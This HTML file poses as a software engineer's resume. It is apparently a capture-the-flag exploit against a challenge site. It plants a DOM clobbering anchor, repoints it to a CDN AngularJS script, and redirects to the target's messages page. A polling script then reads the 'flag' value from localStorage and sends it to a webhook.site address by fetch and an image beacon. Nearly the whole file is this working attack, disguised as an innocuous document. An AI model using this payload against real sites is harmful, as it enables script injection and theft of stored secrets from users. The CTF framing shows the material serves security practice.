<!DOCTYPE html>
<html>
<head>
    <title>My Professional Resume</title>
</head>
<body>
    <h1>Software Engineer Resume</h1>
    <p>Name: John Doe</p>
    <p>Experience: 5 years in web development</p>
    
    <!-- DOM Clobbering Exploit -->
    <!-- This clobbers window.utilsJS to be an HTMLAnchorElement -->
    <a id="utilsJS" name="url" href="x"></a>
    
    <script>
        // Override the href to point to our malicious script on cdnjs
        document.getElementById('utilsJS').href = 
            'https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.3/angular.min.js';
        
        // Redirect to the messages page to trigger loadMessageBoardJS()
        setTimeout(() => {
            window.location.href = 'https://jobclobbering-d61fba936086d20d.chal.secjhu.club/#messages';
        }, 500);
    </script>
    
    <!-- This script will execute after we're redirected back -->
    <script>
        // Poll for when we're on the target site
        const checkAndExfil = setInterval(() => {
            if (window.location.hostname === 'jobclobbering-d61fba936086d20d.chal.secjhu.club') {
                // Wait for page to load
                setTimeout(() => {
                    try {
                        const flag = localStorage.getItem('flag');
                        if (flag) {
                            // Exfiltrate the flag
                            fetch('https://webhook.site/4cc4674b-6ecf-4ef3-b223-44f24c4f5b63/?flag=' + encodeURIComponent(flag))
                                .catch(() => {});
                            
                            // Alternative exfiltration methods
                            new Image().src = 'https://webhook.site/4cc4674b-6ecf-4ef3-b223-44f24c4f5b63/?flag=' + encodeURIComponent(flag);
                            
                            clearInterval(checkAndExfil);
                        }
                    } catch(e) {}
                }, 2000);
            }
        }, 100);
    </script>
</body>
</html>
